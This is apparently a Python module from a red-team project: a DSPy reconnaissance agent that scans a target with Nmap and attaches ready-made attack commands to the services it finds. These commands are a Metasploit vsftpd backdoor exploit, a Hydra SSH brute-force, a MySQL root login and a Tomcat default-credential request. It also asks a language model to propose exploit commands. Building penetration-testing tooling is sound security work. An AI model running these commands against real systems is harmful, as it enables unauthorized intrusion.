import dspy
from dspy import Signature

# Support multiple dspy versions: prefer `InputField`/`OutputField`, fallback to
# `OldInputField`/`OldOutputField` if present.
try:
    from dspy.primitives import InputField, OutputField
except Exception:
    try:
        from dspy.primitives import OldInputField as InputField, OldOutputField as OutputField
    except Exception:
        try:
            from dspy import InputField, OutputField
        except Exception:
            raise ImportError("Could not import InputField/OutputField from dspy; check dspy version.")

import os
import sys
# Ensure the `red-team` directory is on sys.path so `tools.interface` can be imported
# when the script is run directly (e.g. `python3 red-team/agents/orchestrator.py`).
RED_TEAM_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(__file__)))
if RED_TEAM_ROOT not in sys.path:
    sys.path.insert(0, RED_TEAM_ROOT)
from tools.interface import run_nmap_scan
import json

# Define the Signature for the Recon Agent's task
class ReconSignature(Signature):
    """Analyze the Nmap scan output and identify the single most critical vulnerability (CVE or misconfiguration)."""
    # nmap_output is provided as input to the Signature; the rest are outputs
    nmap_output = InputField(desc="The output from the Nmap scan.")
    vulnerability = OutputField(desc="The most critical vulnerability found (e.g., CVE-2021-1234 or 'anonymous ftp access').")
    risk_level = OutputField(desc="The calculated risk level: HIGH, MEDIUM, or LOW.")
    exploit_command = OutputField(desc="A proposed exploit command or next step for the Access phase.")

# Reconnaissance Agent
class ReconAgent(dspy.Module):
    def __init__(self):
        super().__init__()
        self.scanner = dspy.ChainOfThought(ReconSignature)

    def execute(self, target_ip):
        # 1. Run the external tool (Nmap)
        print(f"[{self.__class__.__name__}] Running Nmap scan against {target_ip}...")
        nmap_output = run_nmap_scan(target_ip) # This calls the interface tool
        
        # 2. Parse known vulnerabilities from open ports
        vulnerabilities = []
        for port_info in nmap_output.get("open_ports", []):
            port = port_info.get("port")
            service = port_info.get("service", "").lower()
            if service == "ftp":
                vulnerabilities.append({
                    "summary": f"FTP on port {port} - vulnerable to backdoor (vsftpd 2.3.4)",
                    "risk": "HIGH",
                    "exploit_command": f"msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target_ip}; set RPORT {port}; exploit'"
                })
            elif service == "ssh":
                vulnerabilities.append({
                    "summary": f"SSH on port {port} - potential weak auth",
                    "risk": "MEDIUM",
                    "exploit_command": f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {target_ip} ssh -s {port}"
                })
            elif service == "mysql":
                vulnerabilities.append({
                    "summary": f"MySQL on port {port} - potential default creds or remote access",
                    "risk": "MEDIUM",
                    "exploit_command": f"mysql -h {target_ip} -u root -p"
                })
            elif service == "http":
                vulnerabilities.append({
                    "summary": f"HTTP on port {port} - potential Tomcat manager access (Stapler vuln)",
                    "risk": "HIGH",
                    "exploit_command": f"curl -u admin:admin http://{target_ip}:{port}/manager/html"
                })
            # Add more as needed
        
        if not vulnerabilities:
            vulnerabilities = [{"summary": "No known vulnerabilities detected", "risk": "LOW", "exploit_command": "None"}]

        # 3. Use LLM to analyze further if needed, but for now use parsed
        result = {
            "phase": "RECON",
            "target": target_ip,
            "nmap_raw": nmap_output,
            "vulnerabilities": vulnerabilities,
            "reasoning": f"Found {len(vulnerabilities)} potential vulnerabilities from open services."
        }
        
        return result